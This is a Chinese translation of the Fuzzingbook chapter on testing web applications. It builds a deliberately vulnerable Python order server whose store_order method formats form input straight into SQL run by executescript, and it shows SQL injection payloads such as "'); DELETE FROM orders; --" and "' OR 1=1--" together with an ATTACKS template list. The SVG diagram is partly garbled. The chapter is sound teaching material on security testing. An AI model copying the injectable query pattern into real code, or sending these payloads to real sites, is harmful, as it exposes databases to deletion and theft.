# 测试 Web 应用程序

> 原文：[`www.fuzzingbook.org/html/WebFuzzer.html`](http://www.fuzzingbook.org/html/WebFuzzer.html)

在本章中，我们探讨了如何为图形用户界面（GUI）生成测试，特别是在 Web 界面方面。我们设置了一个（易受攻击的）Web 服务器，并演示了如何系统地探索其行为——首先使用手写的语法，然后使用从用户界面自动推断出的语法。我们还展示了如何对这些服务器进行系统攻击，特别是使用代码和 SQL 注入。

```py
from [bookutils](https://github.com/uds-se/fuzzingbook//tree/master/notebooks/shared/bookutils) import YouTubeVideo
YouTubeVideo('cgtpQ2KLZC8') 
```

## 摘要

要使用本章提供的代码，请编写

```py
>>> from fuzzingbook.WebFuzzer import <identifier> 
```

然后使用以下功能。

本章提供了一个简单（且易受攻击）的 Web 服务器和两个应用于它的实验性模糊器。

### 模糊测试 Web 表单

`WebFormFuzzer`演示了如何与 Web 表单交互。给定一个包含 Web 表单的 URL，它会自动提取一个生成 URL 的语法；这个 URL 包含所有表单元素的价值。支持限于 GET 表单和 HTML 表单元素的一个子集。

这里是我们提取的易受攻击的 Web 服务器的语法：

```py
>>> web_form_fuzzer = WebFormFuzzer(httpd_url)
>>> web_form_fuzzer.grammar['<start>']
['<action>?<query>']
>>> web_form_fuzzer.grammar['<action>']
['/order']
>>> web_form_fuzzer.grammar['<query>']
['<item>&<name>&<email-1>&<city>&<zip>&<terms>&<submit-1>'] 
```

使用它进行模糊测试会产生一个所有表单值都已填充的路径；访问此路径就像填写并提交表单一样。

```py
>>> web_form_fuzzer.fuzz()
'/order?item=lockset&name=%43+&email=+c%40_+c&city=%37b_4&zip=5&terms=on&submit=' 
```

重复调用`WebFormFuzzer.fuzz()`会再次调用表单，每次都使用不同的（模糊测试的）值。

内部，`WebFormFuzzer`基于名为`HTMLGrammarMiner`的辅助类；您可以扩展其功能以包括更多功能。

### SQL 注入攻击

`SQLInjectionFuzzer`是`WebFormFuzzer`的一个实验性扩展，其构造函数接受一个额外的*有效负载*——一个要注入并执行在服务器上的 SQL 命令。否则，它就像`WebFormFuzzer`一样使用：

```py
>>> sql_fuzzer = SQLInjectionFuzzer(httpd_url, "DELETE FROM orders")
>>> sql_fuzzer.fuzz()
"/order?item=lockset&name=+&email=0%404&city=+'+)%3b+DELETE+FROM+orders%3b+--&zip='+OR+1%3d1--'&terms=on&submit=" 
```

如您所见，要检索的路径包含将有效负载编码到表单字段值之一中。

内部，`SQLInjectionFuzzer`基于名为`SQLInjectionGrammarMiner`的辅助类；您可以扩展其功能以包括更多功能。

`SQLInjectionFuzzer`是一个如何构建恶意模糊器的概念证明；您应该学习和扩展其代码以实际使用它。

<svg width="594pt" height="451pt" viewBox="0.00 0.00 593.88 450.50" xmlns:xlink="http://www.w3.org/1999/xlink"><g id="graph0" class="graph" transform="scale(1 1) rotate(0) translate(4 446.5)"><g id="node1" class="node"><title>WebFormFuzzer</title> <g id="a_node1"><a xlink:href="#" xlink:title="class WebFormFuzzer:

Web 表单模糊器"><text text-anchor="start" x="17" y="-177.7" font-family="Patua One, Helvetica, sans-serif" font-weight="bold" font-size="14.00" fill="#b03a2e">WebFormFuzzer</text> <g id="a_node1_0"><a xlink:href="#" xlink:title="WebFormFuzzer"><g id="a_node1_1"><a xlink:href="#" xlink:title="__init__(self, url: str, *, grammar_miner_class: Optional[type] = None, **grammar_fuzzer_options):

构造函数。

`url` - 要模糊测试的 Web 表单的 URL。

`grammar_miner_class` - 语法挖掘器的类

使用（默认：`HTMLGrammarMiner`）

其他关键字参数传递给 `GrammarFuzzer` 构造函数"><text text-anchor="start" x="28.25" y="-155.5" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-weight="bold" font-style="italic" font-size="10.00">__init__()</text></a></g> <g id="a_node1_2"><a xlink:href="#" xlink:title="get_grammar(self, html_text: str):

获取给定 HTML `html_text` 的语法。

在子类中重载。"><text text-anchor="start" x="28.25" y="-142.75" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-style="italic" font-size="10.00">get_grammar()</text></a></g> <g id="a_node1_3"><a xlink:href="#" xlink:title="get_html(self, url: str):

获取给定 URL `url` 的 HTML 文本。

在子类中重载。"><text text-anchor="start" x="28.25" y="-130" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-style="italic" font-size="10.00">get_html()</text></a></g></a></g></a></g></g> <g id="node2" class="node"><title>GrammarFuzzer</title> <g id="a_node2"><a xlink:href="GrammarFuzzer.html" xlink:title="class GrammarFuzzer:

使用推导树高效地从语法中生成字符串。"><text text-anchor="start" x="17.38" y="-303.7" font-family="Patua One, Helvetica, sans-serif" font-weight="bold" font-size="14.00" fill="#b03a2e">GrammarFuzzer</text> <g id="a_node2_4"><a xlink:href="#" xlink:title="GrammarFuzzer"><g id="a_node2_5"><a xlink:href="GrammarFuzzer.html" xlink:title="__init__(self, grammar: Dict[str, List[Expansion]], start_symbol: str = '<start>', min_nonterminals: int = 0, max_nonterminals: int = 10, disp: bool = False, log: Union[bool, int] = False) -> None:

从 `grammar` 中生成字符串，从 `start_symbol` 开始。

如果提供了 `min_nonterminals` 或 `max_nonterminals`，则使用它们作为限制。

为生成的非终结符数量。

如果设置了 `disp`，则显示中间的推导树。

如果设置了 `log`，则将中间步骤作为文本显示在标准输出上。"><text text-anchor="start" x="34.25" y="-281.5" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-weight="bold" font-style="italic" font-size="10.00">__init__()</text></a></g> <g id="a_node2_6"><a xlink:href="GrammarFuzzer.html" xlink:title="fuzz(self) -> str:

从语法中生成字符串。"><text text-anchor="start" x="34.25" y="-268.75" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-weight="bold" font-style="italic" font-size="10.00">fuzz()</text></a></g> <g id="a_node2_7"><a xlink:href="GrammarFuzzer.html" xlink:title="fuzz_tree(self) -> DerivationTree:

从语法中生成推导树 `<text text-anchor="start" x="34.25" y="-256" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-weight="bold" font-size="10.00">fuzz_tree()</text></a></g></a></g></a></g></g> <g id="edge1" class="edge"><title>WebFormFuzzer->GrammarFuzzer</title></g> <g id="node3" class="node"><title>Fuzzer</title> <g id="a_node3"><a xlink:href="Fuzzer.html" xlink:title="class Fuzzer:

模糊测试器的基类 `<text text-anchor="start" x="46.62" y="-425.7" font-family="Patua One, Helvetica, sans-serif" font-weight="bold" font-size="14.00" fill="#b03a2e">Fuzzer</text> <g id="a_node3_8"><a xlink:href="#" xlink:title="Fuzzer"><g id="a_node3_9"><a xlink:href="Fuzzer.html" xlink:title="__init__(self) -> None:

构造函数 `<text text-anchor="start" x="37.25" y="-403.5" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-weight="bold" font-style="italic" font-size="10.00">__init__()</text></a></g> <g id="a_node3_10"><a xlink:href="Fuzzer.html" xlink:title="fuzz(self) -> str:

返回模糊输入 `<text text-anchor="start" x="37.25" y="-390.75" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-weight="bold" font-style="italic" font-size="10.00">fuzz()</text></a></g> <g id="a_node3_11"><a xlink:href="Fuzzer.html" xlink:title="run(self, runner: Fuzzer.Runner = <Fuzzer.Runner object>) -> Tuple[subprocess.CompletedProcess, str]:

使用模糊输入运行 `runner`，`<text text-anchor="start" x="37.25" y="-378" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-weight="bold" font-size="10.00">run()</text></a></g> <g id="a_node3_12"><a xlink:href="Fuzzer.html" xlink:title="runs(self, runner: Fuzzer.Runner = <Fuzzer.PrintRunner object>, trials: int = 10) -> List[Tuple[subprocess.CompletedProcess, str]]:

使用 `runner` 运行模糊输入，`trials` 次 `<text text-anchor="start" x="37.25" y="-365.25" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-weight="bold" font-size="10.00">runs()</text></a></g></a></g></a></g></g> <g id="edge2" class="edge"><title>GrammarFuzzer->Fuzzer</title></g> <g id="node4" class="node"><title>SQLInjectionFuzzer</title> <g id="a_node4"><a xlink:href="#" xlink:title="class SQLInjectionFuzzer:

SQL 注入模糊测试器的简单演示 `<text text-anchor="start" x="8" y="-47.7" font-family="Patua One, Helvetica, sans-serif" font-weight="bold" font-size="14.00" fill="#b03a2e">SQLInjectionFuzzer</text> <g id="a_node4_13"><a xlink:href="#" xlink:title="SQLInjectionFuzzer"><g id="a_node4_14"><a xlink:href="#" xlink:title="__init__(self, url: str, sql_payload: str = '', *, sql_injection_grammar_miner_class: Optional[type] = None, **kwargs):

构造函数。

`url` - 要检索的网页（带有表单）

`sql_payload` - 要执行的 SQL 命令 `<text text-anchor="start" x="37.25" y="-403.5" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-weight="bold" font-style="italic" font-size="10.00">__init__()</text></a></g>

`sql_injection_grammar_miner_class` - 要使用的挖掘器

（默认：SQLInjectionGrammarMiner）

其他关键字参数传递给 `WebFormFuzzer`。"><text text-anchor="start" x="28.25" y="-25.5" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-weight="bold" font-style="italic" font-size="10.00">__init__()</text></a></g> <g id="a_node4_15"><a xlink:href="#" xlink:title="get_grammar(self, html_text):

获取带有 SQL 注入命令的语法。"><text text-anchor="start" x="28.25" y="-12.75" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-style="italic" font-size="10.00">get_grammar()</text></a></g></a></g></a></g></g> <g id="edge3" class="edge"><title>SQLInjectionFuzzer->WebFormFuzzer</title></g> <g id="node5" class="node"><title>WebRunner</title> <g id="a_node5"><a xlink:href="#" xlink:title="class WebRunner:

Web 服务器的运行器。"><text text-anchor="start" x="160.5" y="-47.7" font-family="Patua One, Helvetica, sans-serif" font-weight="bold" font-size="14.00" fill="#b03a2e">WebRunner</text> <g id="a_node5_16"><a xlink:href="#" xlink:title="WebRunner"><g id="a_node5_17"><a xlink:href="#" xlink:title="__init__(self, base_url: Optional[str] = None):

初始化"><text text-anchor="start" x="167.25" y="-25.5" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-weight="bold" font-style="italic" font-size="10.00">__init__()</text></a></g> <g id="a_node5_18"><a xlink:href="#" xlink:title="run(self, url: str) -> Tuple[str, str]:

使用给定输入运行运行器。"><text text-anchor="start" x="167.25" y="-12.75" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-weight="bold" font-style="italic" font-size="10.00">run()</text></a></g></a></g></a></g></g> <g id="node6" class="node"><title>Runner</title> <g id="a_node6"><a xlink:href="Fuzzer.html" xlink:title="class Runner:

测试输入的基类。"><text text-anchor="start" x="174.38" y="-194.45" font-family="Patua One, Helvetica, sans-serif" font-weight="bold" font-size="14.00" fill="#b03a2e">Runner</text> <g id="a_node6_19"><a xlink:href="#" xlink:title="Runner"><g id="a_node6_20"><a xlink:href="Fuzzer.html" xlink:title="FAIL = 'FAIL'"><text text-anchor="start" x="167.25" y="-171.25" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-size="10.00">FAIL</text></a></g> <g id="a_node6_21"><a xlink:href="Fuzzer.html" xlink:title="PASS = 'PASS'"><text text-anchor="start" x="167.25" y="-158.5" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-size="10.00">PASS</text></a></g> <g id="a_node6_22"><a xlink:href="Fuzzer.html" xlink:title="UNRESOLVED = 'UNRESOLVED'"><text text-anchor="start" x="167.25" y="-145.75" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-size="10.00">UNRESOLVED</text></a></g></a></g> <g id="a_node6_23"><a xlink:href="#" xlink:title="Runner"><g id="a_node6_24"><a xlink:href="Fuzzer.html" xlink:title="__init__(self) -> None:

初始化"><text text-anchor="start" x="167.25" y="-126" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-weight="bold" font-style="italic" font-size="10.00">__init__()</text></a></g> <g id="a_node6_25"><a xlink:href="Fuzzer.html" xlink:title="run(self, inp: str) -> Any:

使用给定输入运行运行器"><text text-anchor="start" x="167.25" y="-113.25" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-weight="bold" font-style="italic" font-size="10.00">run()</text></a></g></a></g></a></g></g> <g id="edge4" class="edge"><title>WebRunner->Runner</title></g> <g id="node7" class="node"><title>HTMLGrammarMiner</title> <g id="a_node7"><a xlink:href="#" xlink:title="class HTMLGrammarMiner:

从 HTML 表单中挖掘语法"><text text-anchor="start" x="287.88" y="-181.7" font-family="Patua One, Helvetica, sans-serif" font-weight="bold" font-size="14.00" fill="#b03a2e">HTMLGrammarMiner</text> <g id="a_node7_26"><a xlink:href="#" xlink:title="HTMLGrammarMiner"><g id="a_node7_27"><a xlink:href="#" xlink:title="QUERY_GRAMMAR = {'<start>': ['<action>?<query>'], '<string>': ['<letter>', '<letter><text text-anchor="start" x="315.25" y="-158.5" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-size="10.00">QUERY_GRAMMAR</text><string>'], '<letter>': ['<plus>', '<percent>', '<other>'], '<plus>': ['+'], '<percent>': ['%<hexdigit-1><hexdigit>'], '<hexdigit>': ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'], '<other>': ['0', '1', '2', '3', '4', '5', 'a', 'b', 'c', 'd', 'e', '-', '_'], '<text>': ['<string>'], '<number>': ['<digits>'], '<digits>': ['<digit>', '<digits><digit>'], '<digit>': ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'], '<checkbox>': ['<_checkbox>'], '<_checkbox>': ['on', 'off'], '<email>': ['<_email>'], '<_email>': ['<string>%40<string>'], '<password>': ['<_password>'], '<_password>': ['abcABC.123'], '<hexdigit-1>': ['3', '4', '5', '6', '7'], '<submit>': ['']}"></a></g></a></g> <g id="a_node7_28"><a xlink:href="#" xlink:title="HTMLGrammarMiner"><g id="a_node7_29"><a xlink:href="#" xlink:title="__init__(self, html_text: str) -> None:

构造函数。`html_text` 是要解析的 HTML 字符串。"><text text-anchor="start" x="312.25" y="-138.75" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-weight="bold" font-size="10.00">__init__()</text></a></g> <g id="a_node7_30"><a xlink:href="#" xlink:title="mine_grammar(self) -> Dict[str, List[Expansion]]:

从给定的 HTML 文本中提取语法"><text text-anchor="start" x="312.25" y="-125" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-size="10.00">mine_grammar()</text></a></g></a></g></a></g></g> <g id="node8" class="node"><title>SQLInjectionGrammarMiner</title> <g id="a_node8"><a xlink:href="#" xlink:title="class SQLInjectionGrammarMiner:

自动 SQL 注入攻击语法挖掘演示"><text text-anchor="start" x="268" y="-51.7" font-family="Patua One, Helvetica, sans-serif" font-weight="bold" font-size="14.00" fill="#b03a2e">SQLInjectionGrammarMiner</text> <g id="a_node8_31"><a xlink:href="#" xlink:title="SQLInjectionGrammarMiner"><g id="a_node8_32"><a xlink:href="#" xlink:title="ATTACKS = [&quot;<string>' <sql-values>); <sql-payload>; <sql-comment>&quot;, &quot;<string>' <sql-comment>&quot;, &quot;' OR 1=1<sql-comment>'&quot;, '<number> OR 1=1']"><text text-anchor="start" x="333.25" y="-28.5" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-size="10.00">ATTACKS</text></a></g></a></g> <g id="a_node8_33"><a xlink:href="#" xlink:title="SQLInjectionGrammarMiner"><g id="a_node8_34"><a xlink:href="#" xlink:title="__init__(self, html_text: str, sql_payload: str):

构造函数。

`html_text` - 要攻击的 HTML 表单

`sql_payload` - 要执行的 SQL 命令"><text text-anchor="start" x="324.25" y="-8.75" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-weight="bold" font-style="italic" font-size="10.00">__init__()</text></a></g></a></g></a></g></g> <g id="edge5" class="edge"><title>SQLInjectionGrammarMiner->HTMLGrammarMiner</title></g> <g id="node9" class="node"><title>图例</title> <text text-anchor="start" x="466.62" y="-50.25" font-family="Patua One, Helvetica, sans-serif" font-weight="bold" font-size="10.00" fill="#b03a2e">图例</text> <text text-anchor="start" x="466.62" y="-40.25" font-family="Patua One, Helvetica, sans-serif" font-size="10.00">• </text> <text text-anchor="start" x="472.62" y="-40.25" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-weight="bold" font-size="8.00">public_method()</text> <text text-anchor="start" x="466.62" y="-30.25" font-family="Patua One, Helvetica, sans-serif" font-size="10.00">• </text> <text text-anchor="start" x="472.62" y="-30.25" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-size="8.00">private_method()</text> <text text-anchor="start" x="466.62" y="-20.25" font-family="Patua One, Helvetica, sans-serif" font-size="10.00">• </text> <text text-anchor="start" x="472.62" y="-20.25" font-family="'Fira Mono', 'Source Code Pro', 'Courier', monospace" font-style="italic" font-size="8.00">overloaded_method()</text> <text text-anchor="start" x="466.62" y="-11.2" font-family="Helvetica,sans-Serif" font-size="9.00">将鼠标悬停在名称上以查看文档</text></g></g></svg>

## 一个 Web 用户界面

让我们从简单的例子开始。我们想要设置一个 *Web 服务器*，允许本书的读者购买 fuzzingbook 品牌的粉丝文章（“周边产品”）。实际上，我们会利用现有的 Web 商店（或适当的框架）来完成这个目的。为了本书的目的，我们 *编写了自己的 Web 服务器*，基于 Python 库提供的 HTTP 服务器功能。

<details id="Excursion:-Implementing-a-Web-Server"><summary>实现 Web 服务器</summary>

我们所有的 Web 服务器都在一个 `HTTPRequestHandler` 中定义，正如其名称所暗示的，它处理任意的 Web 页面请求。

```py
from [http.server](https://docs.python.org/3/library/http.server.html) import HTTPServer, BaseHTTPRequestHandler
from [http.server](https://docs.python.org/3/library/http.server.html) import HTTPStatus 
```

```py
class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
  """A simple HTTP server"""
    pass 
```

#### 接受订单

对于我们的 Web 服务器，我们需要多个 Web 页面：

+   我们希望有一个页面，让客户可以下单。

+   我们希望有一个页面，让他们看到订单已确认。

+   此外，我们还需要显示错误消息的页面，例如“页面未找到”。

我们从订单表单开始。字典 `FUZZINGBOOK_SWAG` 包含客户可以订购的项目，以及详细的描述：

```py
import [bookutils.setup](https://github.com/uds-se/fuzzingbook//tree/master/notebooks/shared/bookutils) 
```

```py
from [typing](https://docs.python.org/3/library/typing.html) import NoReturn, Tuple, Dict, List, Optional, Union 
```

```py
FUZZINGBOOK_SWAG = {
    "tshirt": "One FuzzingBook T-Shirt",
    "drill": "One FuzzingBook Rotary Hammer",
    "lockset": "One FuzzingBook Lock Set"
} 
```

这是订单表单的 HTML 代码。选择要订购的赠品的菜单是从 `FUZZINGBOOK_SWAG` 动态创建的。我们省略了许多细节，例如精确的送货地址、付款、购物车等。

```py
HTML_ORDER_FORM = """
<html><body>
<form action="/order" style="border:3px; border-style:solid; border-color:#FF0000; padding: 1em;">
 <strong id="title" style="font-size: x-large">Fuzzingbook Swag Order Form</strong>
 <p>
 Yes! Please send me at your earliest convenience
 <select name="item">
 """
# (We don't use h2, h3, etc. here
# as they interfere with the notebook table of contents)

for item in FUZZINGBOOK_SWAG:
    HTML_ORDER_FORM += \
        '<option value="{item}">{name}</option>\n'.format(item=item,
            name=FUZZINGBOOK_SWAG[item])

HTML_ORDER_FORM += """
 </select>
 <br>
 <table>
 <tr><td>
 <label for="name">Name: </label><input type="text" name="name">
 </td><td>
 <label for="email">Email: </label><input type="email" name="email"><br>
 </td></tr>
 <tr><td>
 <label for="city">City: </label><input type="text" name="city">
 </td><td>
 <label for="zip">ZIP Code: </label><input type="number" name="zip">
 </tr></tr>
 </table>
 <input type="checkbox" name="terms"><label for="terms">I have read
 the <a href="/terms">terms and conditions</a></label>.<br>
 <input type="submit" name="submit" value="Place order">
</p>
</form>
</body></html>
""" 
```

这是订单表单的样子：

```py
from [IPython.display](https://ipython.readthedocs.io/en/stable/api/generated/IPython.display.html) import display 
```

```py
from [bookutils](https://github.com/uds-se/fuzzingbook//tree/master/notebooks/shared/bookutils) import HTML 
```

```py
HTML(HTML_ORDER_FORM) 
```

这个表单目前还没有功能，因为没有服务器在后面；按下“下单”将带您到一个不存在的页面。

#### 订单确认

一旦我们收到订单，我们会显示一个确认页面，该页面使用之前提交的客户信息实例化。以下是 HTML 和渲染效果：

```py
HTML_ORDER_RECEIVED = """
<html><body>
<div style="border:3px; border-style:solid; border-color:#FF0000; padding: 1em;">
 <strong id="title" style="font-size: x-large">Thank you for your Fuzzingbook Order!</strong>
 <p id="confirmation">
 We will send <strong>{item_name}</strong> to {name} in {city}, {zip}<br>
 A confirmation mail will be sent to {email}.
 </p>
 <p>
 Want more swag?  Use our <a href="/">order form</a>!
 </p>
</div>
</body></html>
""" 
```

```py
HTML(HTML_ORDER_RECEIVED.format(item_name="One FuzzingBook Rotary Hammer",
                                name="Jane Doe",
                                email="doe@example.com",
                                city="Seattle",
                                zip="98104")) 
```

**感谢您的 Fuzzingbook 订单！**

我们将向 Seattle 的 Jane Doe 发送 **One FuzzingBook Rotary Hammer**，邮编 98104。

将确认邮件发送到 doe@example.com。

想要更多赠品？请使用我们的 订单表单！

#### 条款和条件

一个网站只有在其包含必要的法律条款的情况下才算完整。这个页面显示了某些条款和条件。

```py
HTML_TERMS_AND_CONDITIONS = """
<html><body>
<div style="border:3px; border-style:solid; border-color:#FF0000; padding: 1em;">
 <strong id="title" style="font-size: x-large">Fuzzingbook Terms and Conditions</strong>
 <p>
 The content of this project is licensed under the
 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Creative Commons
 Attribution-NonCommercial-ShareAlike 4.0 International License.</a>
 </p>
 <p>
 To place an order, use our <a href="/">order form</a>.
 </p>
</div>
</body></html>
""" 
```

```py
HTML(HTML_TERMS_AND_CONDITIONS) 
```

**Fuzzingbook 条款和条件**

本项目的所有内容均受 [Creative Commons Attribution-NonCommercial-ShareAlike 4.0 国际许可协议](https://creativecommons.org/licenses/by-nc-sa/4.0/)许可。

下单时，请使用我们的订单表单.

#### 存储订单

为了存储订单，我们使用一个 *数据库*，存储在文件 `orders.db` 中。

```py
import [sqlite3](https://docs.python.org/3/library/sqlite3.html)
import [os](https://docs.python.org/3/library/os.html) 
```

```py
ORDERS_DB = "orders.db" 
```

要与数据库交互，我们使用 *SQL 命令*。以下命令创建了一个包含五个文本列的表，用于项目、名称、电子邮件、城市和邮编——这些字段与我们也在 HTML 表单中使用的字段完全相同。

```py
def init_db():
    if os.path.exists(ORDERS_DB):
        os.remove(ORDERS_DB)

    db_connection = sqlite3.connect(ORDERS_DB)
    db_connection.execute("DROP TABLE IF EXISTS orders")
    db_connection.execute("CREATE TABLE orders "
                          "(item text, name text, email text, "
                          "city text, zip text)")
    db_connection.commit()

    return db_connection 
```

```py
db = init_db() 
```

到目前为止，数据库仍然是空的：

```py
print(db.execute("SELECT * FROM orders").fetchall()) 
```

```py
[]

```

我们可以使用 SQL 的 `INSERT` 命令添加条目：

```py
db.execute("INSERT INTO orders " +
           "VALUES ('lockset', 'Walter White', "
           "'white@jpwynne.edu', 'Albuquerque', '87101')")
db.commit() 
```

这些值现在已存储在数据库中：

```py
print(db.execute("SELECT * FROM orders").fetchall()) 
```

```py
[('lockset', 'Walter White', 'white@jpwynne.edu', 'Albuquerque', '87101')]

```

我们还可以再次从表中删除条目（例如，在订单完成后）：

```py
db.execute("DELETE FROM orders WHERE name = 'Walter White'")
db.commit() 
```

```py
print(db.execute("SELECT * FROM orders").fetchall()) 
```

```py
[]

```

#### 处理 HTTP 请求

我们有一个订单表单和一个数据库；现在我们需要一个 Web 服务器，将它们全部整合在一起。Python 的 `http.server` 模块提供了我们构建简单 HTTP 服务器的所有所需功能。`HTTPRequestHandler` 是一个对象，它接收并处理 HTTP 请求——特别是用于检索 Web 页面的 `GET` 请求。

我们实现了 `do_GET()` 方法，根据给定的路径，分支以提供请求的 Web 页面。请求路径 `/` 会显示订单表单；以 `/order` 开头的路径会将订单发送以进行处理。所有其他请求都以 `页面未找到` 消息结束。

```py
class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        try:
            # print("GET " + self.path)
            if self.path == "/":
                self.send_order_form()
            elif self.path.startswith("/order"):
                self.handle_order()
            elif self.path.startswith("/terms"):
                self.send_terms_and_conditions()
            else:
                self.not_found()
        except Exception:
            self.internal_server_error() 
```

##### 订单表单

访问主页（即获取`/`页面的内容）很简单：我们按照上面定义的`html_order_form`去提供服务。

```py
class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):
    def send_order_form(self):
        self.send_response(HTTPStatus.OK, "Place your order")
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(HTML_ORDER_FORM.encode("utf8")) 
```

同样，我们可以发送条款和条件：

```py
class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):
    def send_terms_and_conditions(self):
        self.send_response(HTTPStatus.OK, "Terms and Conditions")
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(HTML_TERMS_AND_CONDITIONS.encode("utf8")) 
```

##### 处理订单

当用户在订单表单上点击“提交”时，Web 浏览器创建并检索一个形式为的 URL

```py
<hostname>/order?field_1=value_1&field_2=value_2&field_3=value_3
```

其中`field_i`是 HTML 表中的字段名称，`value_i`是用户提供的值。值使用我们在覆盖率章节中看到的 CGI 编码——即空格被转换为`+`，非数字或字母的字符被转换为`%nn`，其中`nn`是该字符的十六进制值。

如果来自西雅图的 Jane Doe `<doe@example.com>`订购了一件 T 恤，浏览器将创建以下 URL：

```py
<hostname>/order?item=tshirt&name=Jane+Doe&email=doe%40example.com&city=Seattle&zip=98104
```

当处理一个查询时，HTTP 请求处理器的属性`self.path`保存了访问的路径——即`<hostname>`之后的所有内容。辅助方法`get_field_values()`接受`self.path`并返回一个包含值的字典。

```py
import [urllib.parse](https://docs.python.org/3/library/urllib.parse.html) 
```

```py
class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):
    def get_field_values(self):
        # Note: this fails to decode non-ASCII characters properly
        query_string = urllib.parse.urlparse(self.path).query

        # fields is { 'item': ['tshirt'], 'name': ['Jane Doe'], ...}
        fields = urllib.parse.parse_qs(query_string, keep_blank_values=True)

        values = {}
        for key in fields:
            values[key] = fields[key][0]

        return values 
```

方法`handle_order()`从 URL 中获取这些值，存储订单，并返回一个确认订单的页面。如果发生任何错误，它将发送一个内部服务器错误。

```py
class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):
    def handle_order(self):
        values = self.get_field_values()
        self.store_order(values)
        self.send_order_received(values) 
```

存储订单使用上面定义的数据库连接；我们创建一个 SQL 命令，该命令使用从 URL 中提取的值实例化。

```py
class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):
    def store_order(self, values):
        db = sqlite3.connect(ORDERS_DB)
        # The following should be one line
        sql_command = "INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')".format(**values)
        self.log_message("%s", sql_command)
        db.executescript(sql_command)
        db.commit() 
```

存储订单后，我们发送确认 HTML 页面，该页面再次使用 URL 中的值实例化。

```py
class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):
    def send_order_received(self, values):
        # Should use html.escape()
        values["item_name"] = FUZZINGBOOK_SWAG[values["item"]]
        confirmation = HTML_ORDER_RECEIVED.format(**values).encode("utf8")

        self.send_response(HTTPStatus.OK, "Order received")
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(confirmation) 
```

##### 其他 HTTP 命令

除了`GET`命令（执行所有繁重的工作）之外，HTTP 服务器还可以支持其他 HTTP 命令；我们支持`HEAD`命令，它返回 Web 页面的头部信息。在我们的情况下，这总是空的。

```py
class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):
    def do_HEAD(self):
        # print("HEAD " + self.path)
        self.send_response(HTTPStatus.OK)
        self.send_header("Content-type", "text/html")
        self.end_headers() 
```

#### 错误处理

我们已经为提交和处理订单定义了页面；现在我们还需要一些可能发生的错误页面。

##### 页面未找到

如果请求一个不存在的页面（即除`/`或`/order`之外的所有内容），将显示此页面。

```py
HTML_NOT_FOUND = """
<html><body>
<div style="border:3px; border-style:solid; border-color:#FF0000; padding: 1em;">
 <strong id="title" style="font-size: x-large">Sorry.</strong>
 <p>
 This page does not exist.  Try our <a href="/">order form</a> instead.
 </p>
</div>
</body></html>
 """ 
```

```py
HTML(HTML_NOT_FOUND) 
```

**抱歉。**

此页面不存在。请尝试我们的订单表单。

方法`not_found()`负责以适当的 HTTP 状态码发送此信息。

```py
class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):
    def not_found(self):
        self.send_response(HTTPStatus.NOT_FOUND, "Not found")

        self.send_header("Content-type", "text/html")
        self.end_headers()

        message = HTML_NOT_FOUND
        self.wfile.write(message.encode("utf8")) 
```

##### 内部错误

此页面显示任何可能发生的内部错误。出于诊断目的，我们将其包括失败的函数的跟踪信息。

```py
HTML_INTERNAL_SERVER_ERROR = """
<html><body>
<div style="border:3px; border-style:solid; border-color:#FF0000; padding: 1em;">
 <strong id="title" style="font-size: x-large">Internal Server Error</strong>
 <p>
 The server has encountered an internal error.  Go to our <a href="/">order form</a>.
 <pre>{error_message}</pre>
 </p>
</div>
</body></html>
 """ 
```

```py
HTML(HTML_INTERNAL_SERVER_ERROR) 
```

**内部服务器错误**

服务器遇到了内部错误。请访问我们的订单表单.

```py
{error_message}
```

```py
import [sys](https://docs.python.org/3/library/sys.html)
import [traceback](https://docs.python.org/3/library/traceback.html) 
```

```py
class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):
    def internal_server_error(self):
        self.send_response(HTTPStatus.INTERNAL_SERVER_ERROR, "Internal Error")

        self.send_header("Content-type", "text/html")
        self.end_headers()

        exc = traceback.format_exc()
        self.log_message("%s", exc.strip())

